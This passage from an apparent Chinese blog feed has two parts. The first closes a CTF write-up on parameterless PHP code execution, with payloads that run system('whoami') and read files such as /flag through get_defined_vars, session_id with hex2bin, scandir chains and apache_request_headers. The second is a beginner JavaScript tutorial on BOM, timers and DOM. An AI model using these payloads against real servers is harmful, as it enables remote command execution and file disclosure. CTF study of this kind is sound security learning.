alt="image-20220411002803950"></p><p>第二次pos：</p><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411002837861.png" alt="image-20220411002837861"></p><p>成功取出，加上eval函数就可以执行了</p><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411002921084.png" alt="image-20220411002921084"></p><p><strong>payload4</strong></p><pre><code class="python">import requestsfiles = &#123;   &quot;system(&#39;whoami&#39;);&quot;: &quot;&quot;&#125;#data = &#123;#&quot;code&quot;:&quot;eval(pos(pos(end(get_defined_vars()))));&quot;#&#125;r = requests.post(&#39;http://your_vps_ip/1.php?code=eval(pos(pos(end(get_defined_vars()))));&#39;, files=files)print(r.content.decode(&quot;utf-8&quot;, &quot;ignore&quot;))</code></pre><p><code>而如果网站对$_GET,$_POST,$_COOKIE都做的过滤， 那我们只能从$_FILES入手了，file数组在最后一个，需要end定位，然后pos两次定位获得文件名</code></p><h2 id="session-start-函数"><a href="#session-start-函数" class="headerlink" title="session_start()函数"></a>session_start()函数</h2><p>适用于：php7以下的版本</p><p><strong>session_start()</strong></p><pre><code>启动新会话或者重用现有会话，成功开始会话返回 TRUE ，反之返回 FALSE,返回参数给session_id()</code></pre><p><strong>session_id()</strong></p><pre><code>获取/设置当前会话 ID，返回当前会话ID。 如果当前没有会话，则返回空字符串（””）</code></pre><p>可以用这个函数来获取cookie中的<code>phpsessionid</code>了，并且这个值我们是可控的。</p><p>但其有限制：</p><p><strong>文件会话管理器仅允许会话 ID 中使用以下字符：a-z A-Z 0-9 ,（逗号）和 - （减号）</strong></p><p>解决方法：将参数转化为16进制传进去，之后再用hex2bin()函数转换回来就可以了。</p><p><strong>hex2bin()</strong></p><pre><code>转换16进制字符串为二进制字符串</code></pre><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p>payload</p><pre><code>?code=eval(hex2bin(session_id(session_start()))); HTTP/1.1Cookie: PHPSESSID=73797374656d282777686f616d6927293b  # system(&#39;whoami&#39;);</code></pre><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411010515707.png" alt="image-20220411010515707"></p><h3 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h3><pre><code> show_source(session_id(session_start())); var_dump(file_get_contents(session_id(session_start()))); highlight_file(session_id(session_start())); readfile(session_id(session_start())); 然后抓包传入Cookie: PHPSESSID=(想读的文件)即可</code></pre><p>payload</p><pre><code>GET /1.php?code=show_source(session_id(session_start())); HTTP/1.1Cookie: PHPSESSID=/flag</code></pre><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/20220109194247-442d62d6-7141-1.png" alt="img"></p><p>这种方法我并没有测试成功，先写下来吧。</p><h2 id="scandir"><a href="#scandir" class="headerlink" title="scandir"></a>scandir</h2><p><strong>查看当前目录文件名</strong></p><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411011259622.png" alt="image-20220411011259622"></p><p>文件读取</p><p><strong>读取当前目录文件</strong></p><pre><code>当前目录倒数第一位文件：show_source(end(scandir(getcwd())));show_source(current(array_reverse(scandir(getcwd()))));当前目录倒数第二位文件：show_source(next(array_reverse(scandir(getcwd()))));随机返回当前目录文件：highlight_file(array_rand(array_flip(scandir(getcwd()))));show_source(array_rand(array_flip(scandir(getcwd()))));show_source(array_rand(array_flip(scandir(current(localeconv())))));</code></pre><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411011558669.png" alt="image-20220411011558669"></p><p>多试几次</p><p><strong>查看上一级目录文件名</strong></p><pre><code>print_r(scandir(dirname(getcwd())));print_r(scandir(next(scandir(getcwd()))));print_r(scandir(next(scandir(getcwd()))));</code></pre><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411011321325.png" alt="image-20220411011321325"></p><p>函数解释</p><pre><code>array_flip()：交换数组中的键和值，成功时返回交换后的数组，如果失败返回 NULL。array_rand()：从数组中随机取出一个或多个单元，如果只取出一个(默认为1)，array_rand() 返回随机单元的键名。 否则就返回包含随机键名的数组。 完成后，就可以根据随机的键获取数组的随机值。array_flip()和array_rand()配合使用可随机返回当前目录下的文件名dirname(chdir(dirname()))配合切换文件路径</code></pre><p><strong>查看和读取根目录文件</strong></p><p>所获得的字符串第一位有几率是/，需要多试几次</p><pre><code>print_r(scandir(chr(ord(strrev(crypt(serialize(array())))))));</code></pre><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411011343731.png" alt="image-20220411011343731"></p><h1 id="ctf题目讲解"><a href="#ctf题目讲解" class="headerlink" title="ctf题目讲解"></a>ctf题目讲解</h1><h2 id="NoRce"><a href="#NoRce" class="headerlink" title="NoRce"></a>NoRce</h2><p>源码：</p><pre><code class="php">&lt;?phphighlight_file(__FILE__);$exp = $_GET[&#39;exp&#39;];//php7.3 + Apacheif(&#39;;&#39; === preg_replace(&#39;/[^\W]+\((?R)?\)/&#39;, &#39;&#39;, $exp)) &#123;    if(!preg_match(&quot;/o|v|b|print|var|time|file|sqrt|path|dir|exp|pi|an|na|en|ex|et|na|dec|true|false|[0-9]/i&quot;, $exp))&#123;        eval($exp);    &#125;else&#123;        exit(&#39;NoNoNo,U R Hacker~&#39;);    &#125;&#125;else&#123;    exit(&quot;What&#39;s this?&quot;);&#125;?&gt;</code></pre><p>过滤相当严格</p><p>测试一下，发现</p><pre><code>apache_request_headers();</code></pre><p>没有被过滤</p><p>我们还可以利用其它几个没有被过滤的函数构造payload</p><pre><code>die() 函数输出一条消息，并退出当前脚本array_shift() - 删除数组中第一个元素，并返回被删除元素的值</code></pre><p>在我的电脑中，需要把flag头，放在host前，具体原因未知</p><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411013150830.png" alt="image-20220411013150830"></p><p>此时arry_shift()返回的值就是我们要执行的命令</p><p>payload</p><pre><code>?exp=system(array_shift(apache_request_headers()));# postflag: whoami</code></pre><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411013259840.png" alt="image-20220411013259840"></p><p>成功执行命令</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 常见漏洞和手法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码执行 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅学javascript</title>
      <link href="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/"/>
      <url>/2022/04/07/%E6%B5%85%E5%AD%A6javascript/</url>
      
        <content type="html"><![CDATA[<p>该来的永远跑不掉，该补的早晚要补，诶，好好学javascript，我爱学习！！！！！</p><p>[TOC]</p><h1 id="历史"><a href="#历史" class="headerlink" title="历史"></a>历史</h1><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407213804320.png" alt="image-20220407213804320"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407213723069.png" alt="image-20220407213723069"></p><h1 id="javascript的组成部分"><a href="#javascript的组成部分" class="headerlink" title="javascript的组成部分"></a>javascript的组成部分</h1><p>html是骨架，css是对页面进行渲染，js绝对这个页面可以做什么</p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407213908008.png" alt="image-20220407213908008"></p><p>javascript由BOM,DMO,ECMAScript组成 </p><p><strong>BOM</strong></p><p>全名-Browser Object Model,指的是js操作浏览器发送变化的属性和方法</p><p><strong>DOM</strong></p><p>全名-Document Object Model,指的是操作文档流发生变化的属性和方法</p><p><strong>ECMAScript</strong></p><p>指的是JS代码的书写语法和书写规则</p><h1 id="JavaScript-书写位置"><a href="#JavaScript-书写位置" class="headerlink" title="JavaScript 书写位置"></a>JavaScript 书写位置</h1><p><strong>行内式</strong></p><p>a标签-书写在href属性上</p><pre><code class="javascript">&lt;a href=&quot;javascript: JS代码;&quot;&gt;点我一下&lt;/a&gt;</code></pre><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407215348244.png" alt="image-20220407215348244"></p><p>非a标签-书写在行为属性上</p><pre><code class="javascript">&lt;div onclick=&quot;alert(&#39;hello word&#39;)&quot;&gt;点我一下&lt;/div&gt;</code></pre><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407215601888.png" alt="image-20220407215601888"></p><p><strong>内嵌式</strong></p><p>把代码书写在一个script标签对里面,不需要依赖任何行为，打开网页就会执行</p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407215824582.png" alt="image-20220407215824582"></p><p><strong>外链式</strong></p><p>把代码书写在一个.js文件内，外链式js代码，不需要依赖任何行为，打开页面就会执行</p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407220351326.png" alt="image-20220407220351326"></p><h1 id="JavaScript定义变量"><a href="#JavaScript定义变量" class="headerlink" title="JavaScript定义变量"></a>JavaScript定义变量</h1><pre><code class="javascript">var num = 100</code></pre><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407220943173.png" alt="image-20220407220943173"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407220903524.png" alt="image-20220407220903524"></p><h1 id="三种输出方式"><a href="#三种输出方式" class="headerlink" title="三种输出方式"></a>三种输出方式</h1><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407221044266.png" alt="image-20220407221044266"></p><h1 id="JS的数据类型"><a href="#JS的数据类型" class="headerlink" title="JS的数据类型"></a>JS的数据类型</h1><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407221242187.png" alt="image-20220407221242187"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407221932277.png" alt="image-20220407221932277"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407221440539.png" alt="image-20220407221440539"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407221511452.png" alt="image-20220407221511452"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407221817260.png" alt="image-20220407221817260"></p><h1 id="JavaScript数据类型转换"><a href="#JavaScript数据类型转换" class="headerlink" title="JavaScript数据类型转换"></a>JavaScript数据类型转换</h1><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407222131138.png" alt="image-20220407222131138"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407222415779.png" alt="image-20220407222415779"></p><p>当可以合法转换就正常转换，当无法合法转换时，值就变为NAN</p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407230433762.png" alt="image-20220407230433762"></p><p>当可以合法转换就正常转换，当无法合法转换时，如果原值以字母，则返回值为NAN，如果原值以数字+字符串开头，则返回前面的数字而忽略字符串</p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407222543001.png" alt="image-20220407222543001"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407222630874.png" alt="image-20220407222630874"></p><h1 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h1><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407230952623.png" alt="image-20220407230952623"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407231034790.png" alt="image-20220407231034790"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407231109372.png" alt="image-20220407231109372"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407231129915.png" alt="image-20220407231129915"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407231232353.png" alt="image-20220407231232353"></p><h1 id="条件分支语句"><a href="#条件分支语句" class="headerlink" title="条件分支语句"></a>条件分支语句</h1><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407231403054.png" alt="image-20220407231403054"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407231436373.png" alt="image-20220407231436373"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407231551013.png" alt="image-20220407231551013"></p><h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407232532028.png" alt="image-20220407232532028"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407232436701.png" alt="image-20220407232436701"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407232646209.png" alt="image-20220407232646209"></p><h1 id="递归函数"><a href="#递归函数" class="headerlink" title="递归函数"></a>递归函数</h1><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407232807115.png" alt="image-20220407232807115"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407232828922.png" alt="image-20220407232828922"></p><h1 id="作用域"><a href="#作用域" class="headerlink" title="作用域"></a>作用域</h1><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407232920259.png" alt="image-20220407232920259"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407233013700.png" alt="image-20220407233013700"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407233022496.png" alt="image-20220407233022496"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407233059818.png" alt="image-20220407233059818"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407233136738.png" alt="image-20220407233136738"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407233201625.png" alt="image-20220407233201625"></p><h1 id="对象数据类型"><a href="#对象数据类型" class="headerlink" title="对象数据类型"></a>对象数据类型</h1><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407233307155.png" alt="image-20220407233307155"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407233549115.png" alt="image-20220407233549115"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407233644769.png" alt="image-20220407233644769"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407233455066.png" alt="image-20220407233455066"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407233504184.png" alt="image-20220407233504184"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407233523944.png" alt="image-20220407233523944"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407233615368.png" alt="image-20220407233615368"></p><h1 id="数组数据类型"><a href="#数组数据类型" class="headerlink" title="数组数据类型"></a>数组数据类型</h1><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407233743737.png" alt="image-20220407233743737"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407233840225.png" alt="image-20220407233840225"></p><h1 id="数组常用方法"><a href="#数组常用方法" class="headerlink" title="数组常用方法"></a>数组常用方法</h1><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408000927943.png" alt="image-20220408000927943"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407234008850.png" alt="image-20220407234008850"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407234023183.png" alt="image-20220407234023183"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407234038569.png" alt="image-20220407234038569"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407234054841.png" alt="image-20220407234054841"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407234110601.png" alt="image-20220407234110601"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407234132600.png" alt="image-20220407234132600"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407234420968.png" alt="image-20220407234420968"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407234514112.png" alt="image-20220407234514112"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407234540680.png" alt="image-20220407234540680"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407234754392.png" alt="image-20220407234754392"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407234822279.png" alt="image-20220407234822279"></p><p>包前不包后</p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408000322543.png" alt="image-20220408000322543"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408000514401.png" alt="image-20220408000514401"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408000635298.png" alt="image-20220408000635298"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408000653869.png" alt="image-20220408000653869"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408000714136.png" alt="image-20220408000714136"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408000753278.png" alt="image-20220408000753278"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408000801246.png" alt="image-20220408000801246"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408001013869.png" alt="image-20220408001013869"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408001035076.png" alt="image-20220408001035076"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408000830365.png" alt="image-20220408000830365"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408000847454.png" alt="image-20220408000847454"></p><h1 id="字符串常用方法"><a href="#字符串常用方法" class="headerlink" title="字符串常用方法"></a>字符串常用方法</h1><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408001751547.png" alt="image-20220408001751547"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408001220640.png" alt="image-20220408001220640"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408001232044.png" alt="image-20220408001232044"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408001300510.png" alt="image-20220408001300510"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408001325030.png" alt="image-20220408001325030"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408001357820.png" alt="image-20220408001357820"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408001425680.png" alt="image-20220408001425680"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408001432558.png" alt="image-20220408001432558"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408001456688.png" alt="image-20220408001456688"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408001513319.png" alt="image-20220408001513319"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408001558293.png" alt="image-20220408001558293"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408001728712.png" alt="image-20220408001728712"></p><h1 id="数字常用方法"><a href="#数字常用方法" class="headerlink" title="数字常用方法"></a>数字常用方法</h1><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408002711294.png" alt="image-20220408002711294"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408001857190.png" alt="image-20220408001857190"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408001921068.png" alt="image-20220408001921068"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408001959789.png" alt="image-20220408001959789"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408002017326.png" alt="image-20220408002017326"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408002033918.png" alt="image-20220408002033918"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408002053540.png" alt="image-20220408002053540"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408002112036.png" alt="image-20220408002112036"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408002122229.png" alt="image-20220408002122229"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408002133196.png" alt="image-20220408002133196"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408002147147.png" alt="image-20220408002147147"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408002152859.png" alt="image-20220408002152859"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408002208364.png" alt="image-20220408002208364"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408002217762.png" alt="image-20220408002217762"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408002233052.png" alt="image-20220408002233052"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408002257196.png" alt="image-20220408002257196"></p><h1 id="时间常用方法"><a href="#时间常用方法" class="headerlink" title="时间常用方法"></a>时间常用方法</h1><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408002836962.png" alt="image-20220408002836962"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408002855807.png" alt="image-20220408002855807"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408003002403.png" alt="image-20220408003002403"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408003019626.png" alt="image-20220408003019626"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220408003107445.png" alt="image-20220408003107445"></p><h1 id="JavaScript的BOM操作"><a href="#JavaScript的BOM操作" class="headerlink" title="JavaScript的BOM操作"></a>JavaScript的BOM操作</h1><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220410161902503.png" alt="image-20220410161902503"></p><p><strong>1、获取浏览器窗口尺寸</strong></p><pre><code>获取可视窗口宽度: window.innerWidth获取可视窗口高度: window.innerHeight</code></pre><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220410162216868.png" alt="image-20220410162216868"></p><p><strong>2、浏览器的弹出层</strong></p><pre><code>提示框: window.alert(&#39;提示信息&#39;)询问框: window.confirm(&#39;提示信息&#39;) 返回 true和false输入框: window.prompt(&#39;提示信息&#39;) 点确定，返回输入框中内容，点取消返回null</code></pre><p><strong>3、开启和关闭标签页</strong></p><pre><code>开启: window.open(&#39;地址&#39;)关闭: window.close()</code></pre><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220410162721520.png" alt="image-20220410162721520"></p><p><strong>4、浏览器常见事件</strong></p><pre><code>资源加载完毕: window.onload = function() &#123;&#125;可视尺寸改变: window.onresize = function()&#123;&#125;滚动条位置改变: window.onscroll = function()&#123;&#125;</code></pre><ol><li>在页面资源加载完毕执行</li></ol><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220410163103734.png" alt="image-20220410163103734"></p><ol start="2"><li><p>可视窗口发生变化时执行</p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220410163226827.png" alt="image-20220410163226827"></p></li><li><p>滚动条位置改变时执行</p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220410163327867.png" alt="image-20220410163327867"></p></li></ol><p><strong>5、浏览器历史记录操作</strong></p><pre><code>回退页面:window.history.back()前进页面: window.history.forward</code></pre><p><strong>6、浏览器卷去尺寸</strong></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220410163708715.png" alt="image-20220410163708715"></p><ol><li><p>卷去的高度</p><pre><code>document.documentElement.scrollTop #当有&lt;!DOCTYPE html&gt;用这个document.body.scrollTop #当没有&lt;!DOCTYPE html&gt;用这个</code></pre><p>兼容写法</p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220410164045152.png" alt="image-20220410164045152"></p></li><li><p>卷去宽度</p><pre><code>document.documentElement.scrollleft #当有&lt;!DOCTYPE html&gt;用这个document.body.scrollleft #当没有&lt;!DOCTYPE html&gt;用这个</code></pre><p>兼容写法:</p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220410164228039.png" alt="image-20220410164228039"></p></li></ol><p><strong>7、浏览器滚动到</strong></p><pre><code>window.scrolloTo()  #滚动到参数方式1(瞬间定位): window.scrollTo(left,top)        left:浏览器卷去高度        top:浏览器卷去高度参数方式2(滚动定位): window.scrollTo(&#123;        left: xx        top: yy        behavior:&#39;smooth&#39;  #表示平滑滚动&#125;)</code></pre><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220410164500900.png" alt="image-20220410164500900"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220410164841389.png" alt="image-20220410164841389"></p><h1 id="JavaScript定时器"><a href="#JavaScript定时器" class="headerlink" title="JavaScript定时器"></a>JavaScript定时器</h1><p><strong>间隔定时器</strong></p><pre><code>按照指定周期(毫秒)去执行指定的代码语法: setInterval(函数,时间)函数: 每次要执行的内容时间: 单位是毫秒</code></pre><p>示例代码</p><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;head&gt;        &lt;meta charset=&quot;UTF-8&quot;&gt;        &lt;title&gt;sakura&lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;script&gt;            setInterval(function()&#123;                console.log(&#39;执行一次&#39;)            &#125;,1000)  # 单位毫秒，这里也就是1秒        &lt;/script&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220411122709604.png" alt="image-20220411122709604"></p><p>延时定时器</p><pre><code>在固定的时间(毫秒)后指定一次代码语法: setTimeout(函数,时间)函数: 时间到达执行的内容时间: 单位是毫秒</code></pre><p>示例代码</p><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;head&gt;        &lt;meta charset=&quot;UTF-8&quot;&gt;        &lt;title&gt;sakura&lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;script&gt;            setTimeout(function()&#123;                console.log(&#39;执行一次&#39;)            &#125;,1000)        &lt;/script&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220411122948862.png" alt="image-20220411122948862"></p><p><strong>定时器返回值</strong></p><pre><code>不区分定时器种类表示是当前页面的第几个定时器</code></pre><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220411123144526.png" alt="image-20220411123144526"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220411123157829.png" alt="image-20220411123157829"></p><p>是不区分种类的，只表示是页面第几个定时器</p><p><strong>关闭定时器</strong></p><pre><code>语法一: clearInterval(要关闭的定时器返回值)语法二: clearTimeout(要关闭的定时器返回值)这是不区分定时器种类的可以互相关闭</code></pre><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220411135402168.png" alt="image-20220411135402168"></p><h1 id="DOM基本操作"><a href="#DOM基本操作" class="headerlink" title="DOM基本操作"></a>DOM基本操作</h1><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220411135516647.png" alt="image-20220411135516647"></p><p><strong>获取元素方式</strong></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220411135606813.png" alt="image-20220411135606813"></p><ol><li><p>根据id名称获取</p><pre><code>语法: document.getElementById(&#39;id名称&#39;)作用: 获取文档流中id名对应的一个元素返回值:    如果有id对应的元素，就是这个元素    如果没有id对应的元素，就是null</code></pre><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220411140343642.png" alt="image-20220411140343642"></p></li><li><p>根据元素类名获取</p><pre><code>语法: document.getElementsByClassName(&#39;元素类名&#39;)作用: 获取文档流中所有类名对应的元素返回值: 必定是一个伪数组    如果有类名对应的元素，有多少获取多少    如果没用类名对应的元素，空的伪数组</code></pre><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220411141050751.png" alt="image-20220411141050751"></p></li><li><p>根据元素标签名获取</p><pre><code>语法: document.getElementsByTagName(&#39;标签名&#39;)作用； 获取文档流中所有标签名对应的元素返回值；必然是一个伪数组    如果有标签名对应的元素，有多少获取多少    如果没用标签名对应的元素，空的伪数组</code></pre><p> <img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220411141947898.png" alt="image-20220411141947898"></p></li><li><p>根据选择器获取一个</p><pre><code>语法； document.querySelector(&#39;选择器&#39;)作用: 获取文档流中满足选择器规则的第一个元素返回值:    如果有选择器对应的元素，获取到第一个    如果没用选择器对应的元素，返回null</code></pre><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220411142650050.png" alt="image-20220411142650050"></p></li><li><p>根据选择器获取一组</p><pre><code>语法:document.querySelectorAll(&#39;选择器&#39;)作用: 获取文档流中所有满足选择器规则的元素返回值: 必然是一个伪数组    